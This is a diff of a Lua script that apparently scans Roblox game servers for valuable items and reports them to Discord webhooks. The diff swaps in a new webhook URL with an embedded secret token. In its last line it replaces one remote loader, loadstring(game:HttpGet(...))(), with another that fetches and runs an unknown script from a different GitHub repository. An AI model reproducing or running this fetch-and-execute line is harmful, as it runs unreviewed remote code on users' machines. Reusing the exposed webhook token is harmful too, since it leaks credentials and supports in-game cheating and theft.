@@ -31,7 +31,7 @@ min = 101_000_000,
 max = 10_000_000_000
 },
 { -- Special brainrots + overpay
-url = 'https://discord.com/api/webhooks/1447635318089191555/bECsY5k2x6H8BqLwInok1FwGqZOolgKySzsZ8kkGICumh4GmjfOpk1vmvx7kdh3p1U9S',
+url = 'https://discord.com/api/webhooks/1448468449436106853/bv1pXrtVTKcm6etFI56SLLiy89autAGaN5-T1XFEd5808uDsgsLTH9Vyub5T5IMdPgwy',
 title = '⭐️ SPECIAL BRAINROTS',
 color = 0xff00ff,
 special = true
@@ -61,6 +61,7 @@ local SPECIAL_BRAINROTS = {
 ['Guest 666'] = 0,
 ['Lavadorito Spinito'] = 100_000_000,
 ['Fishino Clownino'] = 0,
+['Los Chicleteiras'] = 0,
 ['Tacorita Bicicleta'] = 100_000_000,
 ['La Jolly Grande'] = 200_000_000,
 ['W or L'] = 300_000_000,
@@ -635,4 +636,4 @@ end)
 print('💡 Press F to rescan')
 print('📱 4 webhooks ready: 3 by income range + 1 for special brainrots!')
 print('📋 Press G to copy current JobId to clipboard')
-loadstring(game:HttpGet("https://raw.githubusercontent.com/DEBIL59195/KLIMTYPOU/refs/heads/main/KLIM.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MrStasGames228/asddsa/refs/heads/main/zahod.lua"))()
